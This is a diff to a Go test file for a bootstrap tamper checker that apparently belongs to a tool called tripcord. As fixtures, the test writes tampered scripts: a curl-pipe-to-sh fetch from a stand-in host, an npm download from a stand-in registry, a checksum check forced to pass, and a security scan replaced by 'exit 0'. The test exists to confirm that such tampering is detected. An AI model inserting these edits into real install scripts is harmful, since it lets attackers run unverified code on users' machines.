@@ -206,7 +206,7 @@ func TestCheckBootstrapTampering(t *testing.T) {
 	sum := testPin.SHA256["linux-x64"]
 	for name, edit := range map[string]func(t *testing.T, dir string){
 		"checksum check is true": func(t *testing.T, dir string) {
-			replace(t, dir, BootstrapPath, `[ "$got" = "$want" ]`, `true`)
+			replace(t, dir, BootstrapPath, `[ "$got" != "$want" ]`, `false`)
 		},
 		"scan is exit 0": func(t *testing.T, dir string) {
 			replace(t, dir, BootstrapPath, `"$cached" scan --config "$repo_root" >&2`, `exit 0`)
@@ -214,11 +214,11 @@ func TestCheckBootstrapTampering(t *testing.T) {
 		"curl pipe sh": func(t *testing.T, dir string) {
 			write(t, dir, BootstrapPath, "#!/bin/sh\ncurl -fsSL https://example.invalid/install.sh | sh\n")
 		},
-		"attacker registry": func(t *testing.T, dir string) {
-			replace(t, dir, BootstrapPath, `npm pack --ignore-scripts`, `npm pack --registry https://registry.example.invalid --ignore-scripts`)
+		"download added": func(t *testing.T, dir string) {
+			replace(t, dir, BootstrapPath, `if [ "$mode" = hook ]; then`, "npm pack --registry https://registry.example.invalid @tripcord/cli >/dev/null\nif [ \"$mode\" = hook ]; then")
 		},
-		"cache only": func(t *testing.T, dir string) {
-			replace(t, dir, BootstrapPath, `TRIPCORD_INSTALL_SOURCES="${TRIPCORD_INSTALL_SOURCES:-npm pypi cache}"`, `TRIPCORD_INSTALL_SOURCES='cache'`)
+		"cache moved": func(t *testing.T, dir string) {
+			replace(t, dir, BootstrapPath, `cached="$cache_root/tripcord/`, `cached="/tmp/tripcord/`)
 		},
 		"swapped checksum": func(t *testing.T, dir string) {
 			replace(t, dir, BootstrapPath, sum, strings.Repeat("a", 64))
@@ -243,7 +243,7 @@ func TestCheckBootstrapTampering(t *testing.T) {
 // rendered from the recorded pin, so it is reported, as stale.
 func TestCheckForgedManifestDigest(t *testing.T) {
 	dir := embed(t)
-	replace(t, dir, BootstrapPath, `[ "$got" = "$want" ]`, `true`)
+	replace(t, dir, BootstrapPath, `[ "$got" != "$want" ]`, `false`)
 	raw, err := os.ReadFile(filepath.Join(dir, filepath.FromSlash(BootstrapPath)))
 	if err != nil {
 		t.Fatal(err)
